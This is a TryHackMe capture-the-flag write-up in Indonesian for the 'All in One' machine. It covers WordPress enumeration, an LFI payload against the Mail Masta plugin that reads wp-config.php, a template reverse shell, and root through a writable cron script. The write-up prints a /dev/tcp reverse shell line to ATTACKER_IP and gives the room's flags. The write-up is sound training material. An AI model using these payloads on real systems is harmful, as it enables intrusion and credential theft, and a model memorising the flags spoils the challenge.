# All in One — TryHackMe Writeup

**Target:** All in One  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Kategori:** Web Exploitation, WordPress, Local File Inclusion, Cron Job Privilege Escalation

---

## Recon

Seperti biasa, dimulai dengan mencari port terbuka dan melakukan enumerasi service menggunakan RustScan.

```bash
rustscan -a TARGET_IP
```

![port](images/port.png)

Hasil scanning menunjukkan beberapa service yang menarik, termasuk FTP dan HTTP.

---

## FTP Enumeration

Saya mencoba melakukan login ke service FTP menggunakan anonymous login.

Anonymous login berhasil, tetapi setelah dicek ternyata tidak terdapat file yang berguna.

Karena FTP tidak memberikan attack path yang jelas, saya beralih ke service web yang berjalan di port 80.

---

## Web Enumeration

Homepage yang tampil masih merupakan default Apache2 Ubuntu page.

Karena halaman tersebut hanya merupakan static default page, saya mencoba melakukan directory fuzzing menggunakan FFUF.

```bash
ffuf -w ~/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt \
-u http://TARGET_IP/FUZZ \
-fs 278
```

![ffuf](images/ffuf.png)

Hasil fuzzing menemukan directory WordPress.

Karena target menggunakan WordPress, saya melanjutkan enumerasi menggunakan WPScan.

```bash
wpscan --url http://TARGET_IP/wordpress -e u,ap,t
```

![wpscan](images/wpscan.png)

Hasil WPScan menunjukkan bahwa target memiliki plugin **Mail Masta 1.0** yang sudah cukup lama.

Plugin tersebut diketahui memiliki beberapa vulnerability, termasuk:

- **CVE-2016-10956** — Local File Inclusion (LFI)
- **CVE-2017-6095 / CVE-2017-6098** — SQL Injection (SQLi)

Di sini saya mencoba mengeksploitasi vulnerability LFI terlebih dahulu. Jika tidak berhasil, kemungkinan selanjutnya adalah melakukan investigasi terhadap SQL Injection.

---

## Initial Foothold — Mail Masta LFI

Saya mencoba Proof of Concept untuk **CVE-2016-10956**.

Target ternyata rentan terhadap Local File Inclusion.

Saya kemudian mencoba menggunakan vulnerability tersebut untuk membaca file WordPress `wp-config.php`.

Payload yang digunakan:

```bash
curl "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php" | base64 -d
```

Hasilnya berhasil menampilkan credential:

```php
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );
```

Saya berhasil mendapatkan credential untuk user `elyana`.

Setelah mencoba credential tersebut, saya berhasil login ke WordPress.

![login](images/login.png)

---

## Getting a Shell

Setelah berhasil login ke WordPress, saya mencoba mendapatkan code execution melalui template editor.

Saya mengganti template `404.php` dengan reverse shell.

![404](images/404.png)

Setelah template berhasil diedit, saya mencoba men-trigger halaman tersebut.

Reverse shell berhasil dieksekusi dan saya mendapatkan shell sebagai `www-data`.

![shell](images/shell.png)

---

## www-data Enumeration

Saat melakukan enumerasi, saya menemukan sebuah hint di home directory Elyana.

```text
www-data@TARGET_IP:/home/elyana$ cat hint.txt

Elyana's user password is hidden in the system. Find it ;)
```

Hint tersebut menunjukkan bahwa password user Elyana kemungkinan disimpan di suatu lokasi dalam sistem.

Saya kemudian menjalankan LinPEAS untuk melakukan enumerasi lebih lanjut.

![linpeas](images/linpeas.png)

Dari hasil enumerasi, saya menemukan file:

```text
/etc/mysql/conf.d/private.txt
```

File tersebut berisi credential untuk user `elyana`.

Selain itu, LinPEAS juga menemukan file yang menarik:

```text
/var/backups/script.sh
```

Saya mencoba membaca isi script tersebut:

```bash
cat /var/backups/script.sh
```

Hasilnya:

```bash
#!/bin/bash

#Just a test script, might use it later to for a cron task
```

Script tersebut sendiri belum melakukan sesuatu yang berarti.

Namun saat mengecek cron configuration, ditemukan:

```text
*  *    * * *   root    /var/backups/script.sh
```

Artinya `script.sh` dijalankan setiap menit oleh user `root`.

Saya kemudian mengecek permission file tersebut:

```bash
ls -l /var/backups/script.sh
```

Hasilnya:

```text
-rwxrwxrwx 1 root root 73 Oct  7  2020 /var/backups/script.sh
```

Permission script sangat longgar.

Karena file tersebut writable oleh semua user, termasuk `www-data`, dan dieksekusi setiap menit oleh `root`, maka kita memiliki jalur langsung untuk privilege escalation.

Di sini sebenarnya tidak perlu melakukan pivot ke user `elyana`.

---

## www-data → Root — Writable Cron Job

Karena `/var/backups/script.sh` dijalankan secara otomatis sebagai root dan dapat diedit oleh `www-data`, saya cukup menambahkan reverse shell ke dalam script tersebut.

Payload yang digunakan:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/9005 0>&1' >> /var/backups/script.sh
```

Setelah payload ditambahkan, saya menjalankan listener dan menunggu cron job mengeksekusi script tersebut.

Karena cron job berjalan setiap menit sebagai `root`, reverse shell akhirnya dieksekusi dengan privilege root.

![root](images/root.png)

---

## Flags

### User

```text
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```

### Root

```text
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9t
```


